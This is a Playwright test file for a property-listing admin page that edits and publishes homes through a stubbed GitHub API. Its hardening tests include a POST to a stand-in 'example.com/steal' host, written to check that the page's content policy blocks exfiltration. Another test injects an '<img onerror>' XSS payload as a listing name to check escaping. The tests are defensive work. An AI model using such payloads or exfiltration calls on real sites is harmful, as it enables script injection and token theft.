// Property admin. GitHub is stubbed throughout — no real token is ever used,
// and the tests assert the failure paths as hard as the happy one, because a
// silent failure here means an edit the brothers think they published.
import { test, expect } from '@playwright/test';

const SAMPLE = {
  updated: '2026-01-01T00:00:00.000Z',
  communities: [
    { id: 'cg', name: 'Cypress Grove', place: 'Katy', market: 'Greater Houston', city: 'houston',
      fromPrice: 389900, lots: "55′ – 70′", status: 'Phase 2 Now Selling', statusTone: 'gold',
      amenities: ['12-acre park'], beds: 3, photos: [] },
  ],
  homes: [
    { id: 'the-llano-cg', name: 'The Llano', community: 'cg', story: 'single', price: 354000,
      beds: 3, baths: 2, sqft: 1642, garage: 2, status: 'Move-in ready', photos: [], description: '' },
    { id: 'the-brazos-cg', name: 'The Brazos', community: 'cg', story: 'two', price: 414000,
      beds: 4, baths: 3, sqft: 2684, garage: 2, status: 'Now selling', photos: [], description: '' },
  ],
};

const b64 = (s) => Buffer.from(s, 'utf8').toString('base64');

/**
 * Stubs the GitHub API. `overrides` can force a status on any route so the
 * error paths are exercised. Returns a record of what was PUT.
 */
async function stubGitHub(page, overrides = {}) {
  const puts = [];

  await page.route('https://api.github.com/user', route => {
    if (overrides.user) return route.fulfill(overrides.user);
    route.fulfill({ status: 200, contentType: 'application/json',
      body: JSON.stringify({ login: 'melao' }) });
  });

  await page.route(/api\.github\.com\/repos\/.+\/contents\/data\/properties\.json.*/, route => {
    if (route.request().method() === 'PUT') {
      if (overrides.put) return route.fulfill(overrides.put);
      puts.push(JSON.parse(route.request().postData()));
      return route.fulfill({ status: 200, contentType: 'application/json',
        body: JSON.stringify({ content: { sha: 'newsha' } }) });
    }
    if (overrides.get) return route.fulfill(overrides.get);
    route.fulfill({ status: 200, contentType: 'application/json',
      body: JSON.stringify({ sha: 'oldsha', content: b64(JSON.stringify(SAMPLE)) }) });
  });

  // Photo uploads land on their own paths.
  await page.route(/api\.github\.com\/repos\/.+\/contents\/assets\/properties\/.*/, route => {
    if (overrides.photo) return route.fulfill(overrides.photo);
    puts.push(JSON.parse(route.request().postData()));
    route.fulfill({ status: 200, contentType: 'application/json',
      body: JSON.stringify({ content: { sha: 'photosha' } }) });
  });

  return puts;
}

async function signIn(page) {
  await page.goto('/admin.html');
  await page.fill('#token', 'github_pat_pretend');
  await page.locator('#tokenForm button[type="submit"]').click();
  await expect(page.locator('#editor')).toBeVisible();
}

test.describe('access', () => {
  test('shows the sign-in wall and hides the editor until signed in', async ({ page }) => {
    await page.goto('/admin.html');
    await expect(page.locator('#signIn')).toBeVisible();
    await expect(page.locator('#editor')).toBeHidden();
    await expect(page.locator('#token')).toHaveAttribute('type', 'password');
  });

  test('is kept out of search results', async ({ page }) => {
    await page.goto('/admin.html');
    await expect(page.locator('meta[name="robots"]'))
      .toHaveAttribute('content', /noindex/);
  });

  test('an empty token is refused', async ({ page }) => {
    await page.goto('/admin.html');
    await page.locator('#tokenForm button[type="submit"]').click();
    await expect(page.locator('#tokenErr')).toBeVisible();
  });

  test('a rejected token says so in plain language', async ({ page }) => {
    await stubGitHub(page, { user: { status: 401, contentType: 'application/json',
      body: JSON.stringify({ message: 'Bad credentials' }) } });
    await page.goto('/admin.html');
    await page.fill('#token', 'github_pat_wrong');
    await page.locator('#tokenForm button[type="submit"]').click();
    await expect(page.locator('#tokenErr')).toContainText(/expired or mistyped/i);
    await expect(page.locator('#editor')).toBeHidden();
  });

  test('a token without write access explains what is missing', async ({ page }) => {
    await stubGitHub(page, { put: { status: 403, contentType: 'application/json',
      body: JSON.stringify({ message: 'Resource not accessible' }) } });
    await signIn(page);
    await page.locator('[data-edit="the-llano-cg"]').click();
    await page.fill('#f-name', 'The Llano Revised');
    await page.locator('#dlgSave').click();
    await page.locator('#publish').click();
    await expect(page.locator('#log')).toContainText(/Contents: Read and write/i);
  });

  test('signing out clears the stored token', async ({ page }) => {
    await stubGitHub(page);
    await signIn(page);
    await page.locator('#signOut').click();
    await expect(page.locator('#signIn')).toBeVisible();
    const stored = await page.evaluate(() => localStorage.getItem('melaos.admin.token'));
    expect(stored).toBeNull();
  });
});

test.describe('editing', () => {
  let puts;
  test.beforeEach(async ({ page }) => {
    puts = await stubGitHub(page);
    await signIn(page);
  });

  test('lists what is in the repository', async ({ page }) => {
    await expect(page.locator('#panel-homes article')).toHaveCount(2);
    await expect(page.locator('#tab-homes')).toContainText('(2)');
    await page.locator('#tab-communities').click();
    await expect(page.locator('#panel-communities article')).toHaveCount(1);
    await expect(page.locator('#log')).toContainText('2 homes');
  });

  test('nothing is publishable until something changes', async ({ page }) => {
    await expect(page.locator('#publish')).toBeDisabled();
    await expect(page.locator('#dirtyNote')).toContainText(/Everything is published/i);
  });

  test('an edit marks the site as unpublished', async ({ page }) => {
    await page.locator('[data-edit="the-llano-cg"]').click();
    await expect(page.locator('#dlgTitle')).toHaveText('The Llano');
    await page.fill('#f-price', '369000');
    await page.locator('#dlgSave').click();

    await expect(page.locator('#publish')).toBeEnabled();
    await expect(page.locator('#dirtyNote')).toContainText(/unpublished/i);
    await expect(page.locator('#panel-homes')).toContainText('$369,000');
  });

  test('publishing sends the edited record and clears the flag', async ({ page }) => {
    await page.locator('[data-edit="the-llano-cg"]').click();
    await page.fill('#f-price', '369000');
    await page.locator('#dlgSave').click();
    await page.locator('#publish').click();

    await expect(page.locator('#log')).toContainText(/Published/i);
    await expect(page.locator('#publish')).toBeDisabled();

    const body = puts.find(p => p.message === 'Update properties from admin');
    expect(body, 'a commit should have been sent').toBeTruthy();
    expect(body.sha, 'must send the sha or the write is unsafe').toBe('oldsha');
    const sent = JSON.parse(Buffer.from(body.content, 'base64').toString('utf8'));
    expect(sent.homes.find(h => h.id === 'the-llano-cg').price).toBe(369000);
  });

  test('a new home can be added', async ({ page }) => {
    await page.locator('#addHome').click();
    await page.fill('#f-name', 'The Nueces');
    await page.fill('#f-sqft', '2100');
    await page.fill('#f-price', '399000');
    await page.locator('#dlgSave').click();

    await expect(page.locator('#panel-homes article')).toHaveCount(3);
    await expect(page.locator('#panel-homes')).toContainText('The Nueces');
  });

  test('a listing can be removed', async ({ page }) => {
    page.on('dialog', d => d.accept());
    await page.locator('[data-edit="the-brazos-cg"]').click();
    await page.locator('#dlgDelete').click();
    await expect(page.locator('#panel-homes article')).toHaveCount(1);
    await expect(page.locator('#panel-homes')).not.toContainText('The Brazos');
  });

  test('Escape closes the dialog without saving', async ({ page }) => {
    await page.locator('[data-edit="the-llano-cg"]').click();
    await page.fill('#f-name', 'Should not stick');
    await page.keyboard.press('Escape');
    await expect(page.locator('#dialog')).toBeHidden();
    await expect(page.locator('#panel-homes')).not.toContainText('Should not stick');
    await expect(page.locator('#publish')).toBeDisabled();
  });
});

test('a concurrent publish is reported rather than overwriting', async ({ page }) => {
  await stubGitHub(page, { put: { status: 409, contentType: 'application/json',
    body: JSON.stringify({ message: 'sha mismatch' }) } });
  await signIn(page);
  await page.locator('[data-edit="the-llano-cg"]').click();
  await page.fill('#f-price', '1');
  await page.locator('#dlgSave').click();
  await page.locator('#publish').click();
  await expect(page.locator('#log')).toContainText(/Someone else published/i);
  await expect(page.locator('#publish')).toBeEnabled();
});

test.describe('the site reads what the admin writes', () => {
  test('the marketing page renders from data/properties.json', async ({ page }) => {
    const res = await page.request.get('/data/properties.json');
    expect(res.status()).toBe(200);
    const data = await res.json();
    expect(data.homes.length).toBe(40);
    expect(data.communities.length).toBe(6);

    await page.goto('/index.html');
    await expect(page.locator('.plan')).toHaveCount(40);
    await expect(page.locator('.community')).toHaveCount(6);
  });

  test('an edited record shows up on the public page', async ({ page }) => {
    // Serve a doctored file and confirm the page reflects it, proving the page
    // is genuinely data-driven rather than still rendering hardcoded markup.
    await page.route('**/data/properties.json', route => route.fulfill({
      status: 200, contentType: 'application/json',
      body: JSON.stringify({
        communities: SAMPLE.communities,
        homes: [Object.assign({}, SAMPLE.homes[0], { name: 'The Edited Home', price: 999000 })],
      }),
    }));
    await page.goto('/index.html');
    await expect(page.locator('.plan')).toHaveCount(1);
    await expect(page.locator('#panel-single')).toContainText('The Edited Home');
    await expect(page.locator('#panel-single')).toContainText('$999,000');
  });

  // Caught end to end: $361,500 was displayed as $362,000 because prices were
  // carried in thousands. On a listing, the price shown must be the real price.
  test('prices are shown exactly, not rounded to the nearest thousand', async ({ page }) => {
    await page.route('**/data/properties.json', route => route.fulfill({
      status: 200, contentType: 'application/json',
      body: JSON.stringify({
        communities: [Object.assign({}, SAMPLE.communities[0], { fromPrice: 389950 })],
        homes: [Object.assign({}, SAMPLE.homes[0], { price: 361500 })],
      }),
    }));
    await page.goto('/index.html');
    await expect(page.locator('#panel-single .plan')).toContainText('$361,500');
    await expect(page.locator('#panel-single .plan')).not.toContainText('$362,000');
    await expect(page.locator('.community')).toContainText('$389,950');

    // The filter still works off round thousands.
    await expect(page.locator('#panel-single .plan')).toHaveAttribute('data-price', '362');
  });

  test('a photo on a record replaces the placeholder art', async ({ page }) => {
    await page.route('**/data/properties.json', route => route.fulfill({
      status: 200, contentType: 'application/json',
      body: JSON.stringify({
        communities: SAMPLE.communities,
        homes: [Object.assign({}, SAMPLE.homes[0], { photos: ['assets/logo.png'] })],
      }),
    }));
    await page.goto('/index.html');
    const img = page.locator('#panel-single .plan img');
    await expect(img).toHaveCount(1);
    await expect(img).toHaveAttribute('src', 'assets/logo.png');
  });

  test('if the data file is unreachable the page says so', async ({ page }) => {
    await page.route('**/data/properties.json', route => route.abort());
    await page.goto('/index.html');
    await expect(page.locator('#communityGrid')).toContainText(/could not be loaded/i);
  });

  test('listing text is escaped, not injected as markup', async ({ page }) => {
    await page.route('**/data/properties.json', route => route.fulfill({
      status: 200, contentType: 'application/json',
      body: JSON.stringify({
        communities: SAMPLE.communities,
        homes: [Object.assign({}, SAMPLE.homes[0], { name: '<img src=x onerror=alert(1)>Bad' })],
      }),
    }));
    const errors = [];
    page.on('pageerror', e => errors.push(String(e)));
    await page.goto('/index.html');
    await expect(page.locator('#panel-single .plan h3')).toContainText('<img src=x');
    expect(await page.locator('#panel-single .plan h3 img').count()).toBe(0);
    expect(errors).toEqual([]);
  });
});

test.describe('hardening', () => {
  // This page holds a repo-write token. Anything it loads from a third party
  // could read that token, so it must load nothing from a third party.
  test('loads no third-party resources at all', async ({ page }) => {
    const foreign = [];
    page.on('request', r => {
      const url = r.url();
      if (!url.startsWith('http')) return;
      if (url.includes('127.0.0.1:8080') || url.startsWith('data:') || url.startsWith('blob:')) return;
      foreign.push(url);
    });
    await page.goto('/admin.html');
    await page.waitForTimeout(900);
    expect(foreign, 'admin must not fetch anything off-origin before sign-in').toEqual([]);
  });

  test('declares a policy that pins where data can be sent', async ({ page }) => {
    await page.goto('/admin.html');
    const csp = await page.locator('meta[http-equiv="Content-Security-Policy"]')
      .getAttribute('content');
    expect(csp).toBeTruthy();
    // Only GitHub's API may be contacted — an injected script has nowhere to post to.
    expect(csp).toMatch(/connect-src[^;]*https:\/\/api\.github\.com/);
    expect(csp).toMatch(/default-src\s+'none'/);
    expect(csp).toMatch(/frame-ancestors\s+'none'/);
    expect(csp).toMatch(/base-uri\s+'none'/);
  });

  test('the policy actually blocks an off-origin script', async ({ page }) => {
    await page.goto('/admin.html');
    const blocked = await page.evaluate(async () => {
      try {
        await fetch('https://example.com/steal', { method: 'POST', body: 'x' });
        return false;          // request went through - policy is not enforcing
      } catch (e) {
        return true;           // blocked
      }
    });
    expect(blocked, 'CSP should stop the page contacting anywhere but GitHub').toBe(true);
  });

  test('the token is never written into the page or the URL', async ({ page }) => {
    await stubGitHub(page);
    await signIn(page);
    const html = await page.content();
    expect(html).not.toContain('github_pat_pretend');
    expect(page.url()).not.toContain('github_pat');
  });
});

test.describe('photos wait for publish', () => {
  test.beforeEach(async ({ page }) => {
    await stubGitHub(page);
    await signIn(page);
  });

  const onePixel = {
    name: 'porch.png',
    mimeType: 'image/png',
    // 1x1 PNG
    buffer: Buffer.from(
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==',
      'base64'),
  };

  test('a chosen photo is prepared locally, not uploaded yet', async ({ page }) => {
    const uploads = [];
    await page.route(/api\.github\.com\/repos\/.+\/contents\/assets\/.*/, route => {
      uploads.push(route.request().url());
      route.fulfill({ status: 200, contentType: 'application/json',
        body: JSON.stringify({ content: { sha: 'x' } }) });
    });

    await page.locator('[data-edit="the-llano-cg"]').click();
    await page.locator('#photoInput').setInputFiles(onePixel);
    await expect(page.locator('#photoLog')).toContainText(/upload when you press Publish/i);

    expect(uploads, 'nothing should have been sent to GitHub yet').toEqual([]);
    await expect(page.locator('#photoGrid figure')).toHaveCount(1);
    await expect(page.locator('#photoGrid .pending')).toContainText(/Not published/i);
  });

  test('the card shows how many photos are still unpublished', async ({ page }) => {
    await page.locator('[data-edit="the-llano-cg"]').click();
    await page.locator('#photoInput').setInputFiles(onePixel);
    await page.locator('#dlgSave').click();
    await expect(page.locator('#dirtyNote')).toContainText(/1 photo not yet uploaded/i);
    await expect(page.locator('#panel-homes .pending')).toContainText(/1 not yet published/i);
  });

  test('publishing uploads the photo before the listing file', async ({ page }) => {
    const order = [];
    await page.route(/api\.github\.com\/repos\/.+\/contents\/.*/, route => {
      const url = route.request().url();
      if (route.request().method() === 'PUT') {
        order.push(url.includes('/assets/') ? 'photo' : 'data');
        return route.fulfill({ status: 200, contentType: 'application/json',
          body: JSON.stringify({ content: { sha: 'newsha' } }) });
      }
      route.fulfill({ status: 200, contentType: 'application/json',
        body: JSON.stringify({ sha: 'oldsha', content: b64(JSON.stringify(SAMPLE)) }) });
    });

    await page.locator('[data-edit="the-llano-cg"]').click();
    await page.locator('#photoInput').setInputFiles(onePixel);
    await page.locator('#dlgSave').click();
    await page.locator('#publish').click();

    await expect(page.locator('#log')).toContainText(/Published/i);
    expect(order).toEqual(['photo', 'data']);
    await expect(page.locator('#panel-homes .pending')).toHaveCount(0);
  });

  test('a failed photo upload leaves the listing file untouched', async ({ page }) => {
    let dataWritten = false;
    await page.route(/api\.github\.com\/repos\/.+\/contents\/.*/, route => {
      const url = route.request().url();
      if (route.request().method() === 'PUT') {
        if (url.includes('/assets/')) {
          return route.fulfill({ status: 500, contentType: 'application/json',
            body: JSON.stringify({ message: 'upload exploded' }) });
        }
        dataWritten = true;
        return route.fulfill({ status: 200, contentType: 'application/json',
          body: JSON.stringify({ content: { sha: 'newsha' } }) });
      }
      route.fulfill({ status: 200, contentType: 'application/json',
        body: JSON.stringify({ sha: 'oldsha', content: b64(JSON.stringify(SAMPLE)) }) });
    });

    await page.locator('[data-edit="the-llano-cg"]').click();
    await page.locator('#photoInput').setInputFiles(onePixel);
    await page.locator('#dlgSave').click();
    await page.locator('#publish').click();

    await expect(page.locator('#log')).toContainText(/Could not publish/i);
    expect(dataWritten, 'the site must not point at a photo that never uploaded').toBe(false);
    await expect(page.locator('#publish')).toBeEnabled();
  });

  test('removing a prepared photo drops it without contacting GitHub', async ({ page }) => {
    await page.locator('[data-edit="the-llano-cg"]').click();
    await page.locator('#photoInput').setInputFiles(onePixel);
    await expect(page.locator('#photoGrid figure')).toHaveCount(1);
    await page.locator('[data-drop="0"]').click();
    await expect(page.locator('#photoGrid figure')).toHaveCount(0);
    await expect(page.locator('#publish')).toBeDisabled();
  });
});
